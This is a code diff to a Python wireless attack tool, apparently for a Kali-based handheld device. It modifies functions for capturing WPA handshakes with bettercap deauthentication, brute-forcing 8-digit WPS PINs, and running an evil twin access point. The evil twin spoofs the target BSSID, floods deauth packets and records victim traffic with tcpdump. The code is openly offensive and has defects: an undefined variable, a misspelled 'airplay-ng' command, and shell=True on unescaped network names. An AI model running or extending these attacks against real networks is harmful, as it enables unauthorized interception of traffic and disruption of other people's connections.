@@ -29,11 +29,14 @@ class netstd():
                 )
         return result
 
+    def subkill(self):
+        subprocess.Popen.kill(process)
+        return 1
 
     def bk(self):
         if GPIO.input(KEY3_PIN) == 0:
             return True
-        
+
     def key2(self):
         if GPIO.input(KEY2_PIN) == 0:
             return True
@@ -61,7 +64,7 @@ class netstd():
             return 1
         else:
             return 0
-        
+
     def interface_stop(self, INTERFACE):
         os.system(f"sudo ifconfig {INTERFACE} down")
         os.system(f"sudo airmon-ng stop {INTERFACE}")
@@ -70,7 +73,7 @@ class netstd():
             return 1
         else:
             return 0
-        
+
     def interface_start1(self, INTERFACE):
         time.sleep(0.5)
         os.system(f"sudo ifconfig {INTERFACE} down")
@@ -80,11 +83,11 @@ class netstd():
         if self.bk() == True:
             return 1
         else:
-            return 0 
-        
+            return 0
+
 #HANDSHAKE
     #HANDSHAKE CAPTURE
-    def initialization(self, selected_chan, selected_option, selected_bssid, INTERFACE):
+    def initialization(self, selected_chan, selected_ssid, selected_bssid, INTERFACE, a):
         bk_ = 0
         commands = [
             'wifi.recon on',
@@ -92,10 +95,14 @@ class netstd():
             f'set wifi.recon channel {selected_chan}',
             'set net.sniff.verbose true',
             'set net.sniff.filter ether proto 0x888e',
-            f'set net.sniff.output /home/kali/mojito/wpa_handshakes/wpa_{selected_option}_.pcap',
+            f'set net.sniff.output /home/kali/mojito/wpa_handshakes/wpa_{selected_ssid}_.pcap',
             'net.sniff on',
             f'wifi.deauth {selected_bssid}'
         ]
+
+        if a == 1:
+            commands.remove(commands[4])
+            commands[5] = f'set net.sniff.output /home/kali/mojito/wpa_handshakes/wpa_{selected_ssid}_.pcapng'
 
         messages = [
             "Starting Recon...",
@@ -132,14 +139,14 @@ class netstd():
                 file.write(self.bettercap_process.stdout.readline())
 
         return 0
-    
+
 
 
 #WPS
     #WPS BRUTE FORCE
     def generate(self):
         for var in range(0, 100000000):
-            yield f"{var:08d}"  
+            yield f"{var:08d}"
 
     def connect(self, selected_option, wps_pin, INTERFACE):
         try:
@@ -151,7 +158,7 @@ class netstd():
             else:
                 ui_print(f"PIN {wps_pin} failed.")
                 return 1
-            
+
         except Exception as e:
             ui_print(f"Error {wps_pin}:\n {e}")
             with open("/home/kali/mojito/logs/output2.txt", 'a') as file:
@@ -172,7 +179,14 @@ class netstd():
     #EVIL TWIN
     def evil_twin(self, INTERFACE, selected_option, selected_bssid, selected_chan):
         #os.system(f"sudo airmon-ng check kill")
-        os.system(f"sudo airbase-ng -e {selected_option} -c {selected_chan} {INTERFACE}")
+        subprocess.Popen(
+        ['sudo', 'airbase-ng', '-a', selected_bssid, '-e', selected_option, '-c', str(selected_chan), INTERFACE],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+        bufsize=1
+        )
         commands = [
             "sudo ip link add name mojito_wlan type bridge",
             "sudo ip link set mojito_wlan up",
@@ -181,34 +195,21 @@ class netstd():
             "sudo dhclient mojito_wlan &",
             f"sudo airplay-ng --deauth 1000 -a {selected_bssid} {INTERFACE} --ignore-negative-one",
         ]
-        print("Starting Evil Twin...")
+
         for i in commands:
-            if self.bk() == True:
-                return 1
-            process = subprocess.Popen(i, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
+            process = subprocess.Popen(i, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True, bufsize=1)
             with open("/home/kali/mojito/logs/evil_twin.log", 'a') as file:
                 file.write(process.stdout.readline())
             time.sleep(0.5)
             print(i)
-
         process = subprocess.Popen(
-            ['sudo', 'tcpdump', '-i', 'mojito_wlan', '-w', f'/home/kali/mojito/pcap/evil_twin_{selected_option}.pcap'],
+            ['sudo', 'tcpdump', '-i', 'mojito_wlan', '-w', '/home/kali/mojito/pcap/evil_twin.pcap'],
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True,
             bufsize=1
         )
-        print("Starting tcpdump...")
         with open("/home/kali/mojito/logs/evil_twin.log", 'a') as file:
             file.write(process.stdout.readline())
-        
-        while True:
-            if self.bk() == True:
-                subprocess.Popen.kill(process)
-                return 1
-                
-
-    
-
-        
+        return 0
